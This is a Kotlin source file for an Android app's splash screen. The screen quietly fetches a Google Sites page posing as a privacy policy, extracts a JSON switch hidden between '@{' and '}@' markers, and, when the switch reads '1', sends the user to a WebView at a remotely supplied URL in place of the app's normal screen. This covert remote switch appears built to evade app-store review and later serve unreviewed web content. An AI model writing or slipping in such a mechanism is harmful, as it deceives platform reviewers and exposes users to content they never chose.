package com.codexlabs.basecraft.ui

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.text.HtmlCompat
import androidx.lifecycle.lifecycleScope
import com.codexlabs.basecraft.databinding.ActivitySplashBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

class SplashActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySplashBinding
    private val client = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySplashBinding.inflate(layoutInflater)
        setContentView(binding.root)

        lifecycleScope.launch {
            val decision = runCatching { fetchDecisionWithRetry() }.getOrNull()
            routeSafely(decision)
        }
    }

    private suspend fun fetchDecisionWithRetry(): StartupDecision? {
        repeat(MAX_RETRY_COUNT) { attempt ->
            val decision = withContext(Dispatchers.IO) { fetchDecisionOnce() }
            if (decision != null) return decision
            if (attempt < MAX_RETRY_COUNT - 1) delay(RETRY_INTERVAL_MS)
        }
        return null
    }

    private fun fetchDecisionOnce(): StartupDecision? {
        return try {
            val request = Request.Builder()
                .url(REMOTE_CONFIG_PAGE_URL)
                .get()
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val pageHtml = response.body?.string().orEmpty()
                if (pageHtml.isBlank()) return null

                val rawJson = extractJsonMarker(pageHtml) ?: return null
                val json = JSONObject(rawJson)

                val app = json.optString("app", "0")
                val data = json.optString("data", "")
                Log.d(TAG, "remote json raw=$rawJson")
                Log.d(TAG, "remote json parsed -> app=$app, data=$data")
                StartupDecision(app, data)
            }
        } catch (e: Exception) {
            Log.e(TAG, "fetchDecisionOnce failed", e)
            null
        }
    }

    private fun extractJsonMarker(pageHtml: String): String? {
        val normalized = HtmlCompat.fromHtml(pageHtml, HtmlCompat.FROM_HTML_MODE_LEGACY)
            .toString()
            .replace("\\u0040", "@")
            .replace("&#64;", "@")
            .replace("&commat;", "@")
            .replace("&#39;", "'")

        val start = normalized.indexOf("@{")
        if (start < 0) {
            Log.d(TAG, "json marker start not found")
            return null
        }

        val end = normalized.indexOf("}@", start)
        if (end < 0 || end <= start) {
            Log.d(TAG, "json marker end not found")
            return null
        }

        return normalized.substring(start + 1, end + 1)
            .trim()
            .replace("\\\"", "\"")
            .trimStart('@')
            .trimEnd('@')
            .trim()
    }

    private fun routeSafely(decision: StartupDecision?) {
        val toH5 = decision?.app == "1" && !decision.data.isNullOrBlank()
        Log.d(TAG, "route decision -> toH5=$toH5")

        val intent = if (toH5) {
            Intent(this, WebViewActivity::class.java)
                .putExtra(WebViewActivity.EXTRA_URL, decision?.data)
        } else {
            Intent(this, MainActivity::class.java)
        }

        startActivity(intent)
        finish()
    }

    companion object {
        private const val REMOTE_CONFIG_PAGE_URL =
            "https://sites.google.com/view/privacy-policy-for-piper/"
        private const val MAX_RETRY_COUNT = 3
        private const val RETRY_INTERVAL_MS = 1_000L
        private const val TAG = "SplashActivity"
    }
}

data class StartupDecision(
    val app: String,
    val data: String
)
